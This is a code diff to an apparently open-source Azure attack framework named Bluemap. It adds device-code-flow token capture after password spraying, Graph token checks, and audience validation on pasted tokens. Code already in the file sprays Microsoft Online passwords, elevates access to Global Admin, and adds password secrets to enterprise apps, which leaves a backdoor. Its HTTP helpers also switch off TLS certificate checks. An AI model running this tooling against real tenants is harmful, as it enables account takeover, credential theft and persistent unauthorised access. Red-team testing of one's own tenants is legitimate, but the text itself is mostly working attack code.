@@ -16,6 +16,7 @@ import ssl, re
 
 Token = None
 RefreshToken = None
+RefreshTokenGraph = None
 AutoGenToken = False
 accessTokenGraph = None
 accessTokenVault = None
@@ -202,6 +203,62 @@ def sendPOSTRequestRefreshToken(tenantId, token):
         pass
     return object
 
+def DeviceCodeFlow():
+    object = {}
+    o = urlparse("https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0")
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    conn = http.client.HTTPSConnection(o.netloc)
+    headers = {
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+    data = {
+        'client_id' : 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
+        'grant_type': 'urn:ietf:params:oauth:grant-type:device_code',
+        'scope' : 'User.Read Users.Read openid profile offline_access',
+        'code': 'AAAA'
+    }
+    qs = urllib.parse.urlencode(data)
+    conn.request("POST", str(o.path), qs, headers)
+    res = conn.getresponse()
+    object["headers"] = dict(res.getheaders())
+    object["status_code"] = int(res.status)
+    object["response"] = str(res.read().decode("utf-8"))
+    try:
+        object["json"] = json.loads(object["response"])
+    except json.JSONDecodeError:
+        pass
+    return object
+
+def DeviceCodeFlowAuthUser(teantnId, deviceCode, userCode):
+    object = {}
+    o = urlparse("https://login.microsoftonline.com/"+str(teantnId)+"/oauth2/v2.0/token")
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    conn = http.client.HTTPSConnection(o.netloc)
+    headers = {
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+    data = {
+        'tenant': teantnId,
+        'grant_type': 'urn:ietf:params:oauth:grant-type:device_code',
+        'client_id' : 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
+        'device_code': deviceCode
+    }
+    qs = urllib.parse.urlencode(data)
+    conn.request("POST", str(o.path), qs, headers)
+    res = conn.getresponse()
+    object["headers"] = dict(res.getheaders())
+    object["status_code"] = int(res.status)
+    object["response"] = str(res.read().decode("utf-8"))
+    try:
+        object["json"] = json.loads(object["response"])
+    except json.JSONDecodeError:
+        pass
+    return object
+
 def sendPUTRequest(url, body, Token):
     object = {}
     o = urlparse(url)
@@ -277,6 +334,23 @@ def setToken(token):
 def initRefreshToken(TokenRF):
     global RefreshToken
     RefreshToken = TokenRF
+
+def initRefreshGraphToken(TokenRFGraph):
+    global RefreshTokenGraph
+    RefreshTokenGraph = TokenRFGraph
+
+def initTokenWithGraph(token, graphToken):
+    global Token, accessTokenGraph,TargetSubscription, TargetTenantId, hasGraphAccess, hasMgmtAccess
+    hasGraphAccess = True
+    hasMgmtAccess = True
+    Token = token
+    accessTokenGraph = graphToken
+    try:
+        listSubs = ListSubscriptionsForToken()
+        TargetSubscription = listSubs['value'][0]['subscriptionId']
+        TargetTenantId = parseTenantId()
+    except KeyError:
+        pass
 
 def initToken(token, resetscopes):
     global Token, hasMgmtAccess, hasGraphAccess, hasVaultEnabled,TargetSubscription, TargetTenantId
@@ -361,7 +435,6 @@ def ENUM_MSOLSpray(username,password):
             return "Got unknown error"
 
 
-
 def ReloadToken():
     global RefreshToken
     r = sendPOSTRequestRefreshToken(parseTenantId(), RefreshToken )
@@ -383,6 +456,17 @@ def CheckSubscriptionReqState():
         ReloadToken()
         r = sendGETRequest("https://management.azure.com/subscriptions/?api-version=2017-05-10", Token)
         return r
+
+'''
+ The method used to check token state for graph based methods
+'''     
+def CheckSubscriptionReqGraphState():
+    global accessTokenGraph
+    r = sendGETRequest("https://graph.microsoft.com/v1.0/users/", accessTokenGraph)
+    if len(r['json']) == 0:
+        return False
+    else:
+        return True
 
 ''' Based on AADInternals Research (https://aadinternals.com/post/just-looking/) '''
 
@@ -445,8 +529,11 @@ def ContainerACL(storageAccount):
 
 def RD_ListAllUsers():
     global accessTokenGraph
-    r = sendGETRequest("https://graph.microsoft.com/v1.0/users/", accessTokenGraph)
-    return r["json"]
+    if CheckSubscriptionReqGraphState():
+        r = sendGETRequest("https://graph.microsoft.com/v1.0/users/", accessTokenGraph)
+        return r["json"]
+    else:
+        print("Need to refresh token / obtain token for MSGraph.")
 
 def GA_ElevateAccess():
     global Token
@@ -476,8 +563,11 @@ def GA_AssignSubscriptionOwnerRole(subscriptionId):
 
 def RD_AddAppSecret():
     global accessTokenGraph
-    r = sendGETRequest("https://graph.microsoft.com/v1.0/applications", accessTokenGraph)
-    return r['json']
+    if CheckSubscriptionReqGraphState():
+        r = sendGETRequest("https://graph.microsoft.com/v1.0/applications", accessTokenGraph)
+        return r['json']
+    else:
+        print("Need to refresh token / obtain token for MSGraph.")
 
 def getResGroup(subid):
     global Token
@@ -842,31 +932,37 @@ def RD_ListARMTemplates():
     
 def CHK_AppRegOwner(appId):
     global accessTokenGraph
-    r = sendGETRequest("https://graph.microsoft.com/v1.0/applications?$filter=" + urllib.parse.quote("appId eq '" + appId + "'"), accessTokenGraph)
-    appData = r['json']['value'][0]['id']
-    AppOwners = sendGETRequest("https://graph.microsoft.com/v1.0/applications/" + str(appData) + "/owners", accessTokenGraph)
-    if str(parseUPN()) in AppOwners["response"]:
-        return "Yes! Try Exploit: Reader/abuseServicePrincipals"
+    if CheckSubscriptionReqGraphState():
+        r = sendGETRequest("https://graph.microsoft.com/v1.0/applications?$filter=" + urllib.parse.quote("appId eq '" + appId + "'"), accessTokenGraph)
+        appData = r['json']['value'][0]['id']
+        AppOwners = sendGETRequest("https://graph.microsoft.com/v1.0/applications/" + str(appData) + "/owners", accessTokenGraph)
+        if str(parseUPN()) in AppOwners["response"]:
+            return "Yes! Try Exploit: Reader/abuseServicePrincipals"
+        else:
+            return "N/A"
     else:
-        return "N/A"
+        print("Need to refresh token / obtain token for MSGraph.")
 
 def RD_addPasswordForEntrepriseApp(appId):
     global accessTokenGraph
-    r = sendGETRequest(
-        "https://graph.microsoft.com/v1.0/applications?$filter=" + urllib.parse.quote("appId eq '" + appId + "'"),
-        accessTokenGraph)
-    appData = r['json']['value'][0]['id']
-    req = {
-            "passwordCredential": {
-                "displayName": "Password"
-            }
-    }
-    addSecretPwd = sendPOSTRequest("https://graph.microsoft.com/v1.0/applications/" + str(appData) + "/addPassword", req, accessTokenGraph)
-    if addSecretPwd['status_code'] == 200:
-        pwdOwn = addSecretPwd['json']
-        return "AppId: " + pwdOwn['keyId'] + "| Pwd: " + pwdOwn['secretText']
+    if CheckSubscriptionReqGraphState():
+        r = sendGETRequest(
+            "https://graph.microsoft.com/v1.0/applications?$filter=" + urllib.parse.quote("appId eq '" + appId + "'"),
+            accessTokenGraph)
+        appData = r['json']['value'][0]['id']
+        req = {
+                "passwordCredential": {
+                    "displayName": "Password"
+                }
+        }
+        addSecretPwd = sendPOSTRequest("https://graph.microsoft.com/v1.0/applications/" + str(appData) + "/addPassword", req, accessTokenGraph)
+        if addSecretPwd['status_code'] == 200:
+            pwdOwn = addSecretPwd['json']
+            return "AppId: " + pwdOwn['keyId'] + "| Pwd: " + pwdOwn['secretText']
+        else:
+            return "N/A"
     else:
-        return "N/A"
+        print("Need to refresh token / obtain token for MSGraph.")
 
 def tryGetToken():
     global accessTokenGraph, accessTokenVault, hasGraphAccess, hasMgmtAccess, hasVaultEnabled
@@ -1065,12 +1161,20 @@ def shadownAccounts():
 def AutoRecon():
     print("\nChecking for current SubscriptionId: " + str(TargetSubscription))
     print("\n===== Checking Available Resources =====\n")
+    print("Checking all Storage Accounts..")
     totalStorageAccounts = len(RD_ListAllStorageAccounts())
+    print("Checking all VMS...")
     totalVMs = len(RD_ListAllVMs())
+    print("Checking all deployments...")
     totalDeployments = len(RD_ListAllDeployments())
+    print("Checking all app registrations...")
     totalAppRegistrations = len(RD_AddAppSecret())
+    print("Checking all ACRs...")
     totalACRs = len(RD_ListAllACRs())
+    print("Checking all automation runbooks...")
     totalRubBooks = len(RD_ListRunBooksByAutomationAccounts())
+
+    print("\nTotal Found:")
     print("Storage Account: " + str(totalStorageAccounts))
     print("Virtual Machines: " + str(totalVMs))
     print("Deployments: " + str(totalDeployments))
@@ -1219,9 +1323,8 @@ def getToken():
 
 def ListSubscriptionsForToken():
     global Token
-    r = CheckSubscriptionReqState()
+    r = sendGETRequest("https://management.azure.com/subscriptions/?api-version=2017-05-10", Token)
     return r['json']
-
 
 def GetAllResourcesUnderSubscription(subscriptionId, token):
     r = sendGETRequest("https://management.azure.com/subscriptions/" + subscriptionId + "/resources?api-version=2017-05-10", token)
@@ -1247,6 +1350,7 @@ def attackWindow():
     '''
     supportedCommands = [
         "version",
+        "test",
         "whoami",
         "scopes",
         "get_subs",
@@ -1317,6 +1421,8 @@ def attackWindow():
         else:
             if mode == "run" and ExploitChoosen is None:
                 print("Use run command only within an exploit.")
+            elif mode == "test":
+                print(RD_ListAllStorageAccounts())
             elif mode == "version":
                 print("Bluemap 1.0.0-Beta")
             elif mode == "whoami":
@@ -1357,12 +1463,10 @@ def attackWindow():
                 if TargetSubscription == None:
                     print("Use set_target to set a subscription to work on.")
                 else:
-                    AutoRecon()
-            elif "autorecon" in mode:
-                if TargetSubscription == None:
-                    print("Use set_target to set a subscription to work on.")
-                else:
-                    AutoRecon()
+                    if CheckSubscriptionReqGraphState():
+                        AutoRecon()
+                    else:
+                        print("Missing MSGraphs scope in current user token for autorecon module.\nAbort!")
             elif "shadowacc" in mode:
                 if TargetSubscription == None:
                     print("Use set_target to set a subscription to work on.")
@@ -1555,8 +1659,13 @@ def attackWindow():
             elif "Token/SetToken" in ExploitChoosen and mode == "run":
                 print("Please paste your Azure token here:")
                 token = input("Enter Token:")
-                initToken(token, True)
-                print("All set.")
+                check = token.split(".")[1]
+                audAttribue = json.loads(base64.b64decode(check))['aud']
+                if audAttribue != "https://management.azure.com/":
+                    print("Error: Token/SetToken support only management.azure.com scope tokens.")
+                else:
+                    initToken(token, True)
+                    print("All set.")
             elif "Token/RefreshToken" in ExploitChoosen and mode == "run":
                 ''' For Token/GenToken method '''
                 if AutoGenToken == True:
@@ -1566,8 +1675,7 @@ def attackWindow():
                         print("Token Refresh. Done.")
                 else:
                     ''' For any other manual method (Token/SetToken or Token/AuthToken)'''
-                    ReloadToken()
-                    print("Token Refresh. Done.")
+                    print("Refresh token not supported for Token/SetToken or Token/AuthToken. Try to login again.")
             elif "Reader/ExposedAppServiceApps" in ExploitChoosen and mode == "run":
                 print("Trying to enumerate all external-facing Azure Service Apps..")
                 if len(RD_ListExposedWebApps()) < 1:
@@ -1796,11 +1904,28 @@ def attackWindow():
                 r = sendPOSTRequestSprayMSOL("https://login.microsoft.com/common/oauth2/token", user, pwd, True)
                 response = r["json"]
                 if 'access_token' in response:
-                    initToken(response['access_token'], True)
-                    initRefreshToken(response['refresh_token'])
-                    print("Logged In!")
+                    print("Credentials OK, continue..")
+                    x = DeviceCodeFlow()
+                    dc = x["json"]["device_code"]
+                    uc = x["json"]["user_code"]
+                    print("Now follow the next steps to complete the process:")
+                    print(x["json"]["message"])
+                    while(True):
+                        res = DeviceCodeFlowAuthUser("5adb82f3-e85b-42af-b237-adf6e094f963",dc, uc)["json"]
+                        if 'error_description' in res:
+                            continue
+                        else:
+                            if 'expired_token' in res:
+                                print("Expired Token, try again!")
+                                break
+                            else:
+                                accessTokenGraph = res
+                                initTokenWithGraph(response['access_token'], accessTokenGraph['access_token'])
+                                initRefreshToken(response['refresh_token'])
+                                print("Captured token!")
+                                break
                 else:
-                    print("Invalid username / password")
+                    print("Invalid username / password.")
             elif "External/EmailEnum" in ExploitChoosen and mode == "run":
                 DestPath = input("Please enter the path for emails [i.e. C:\\emails.txt]: ")
                 if DestPath == "":
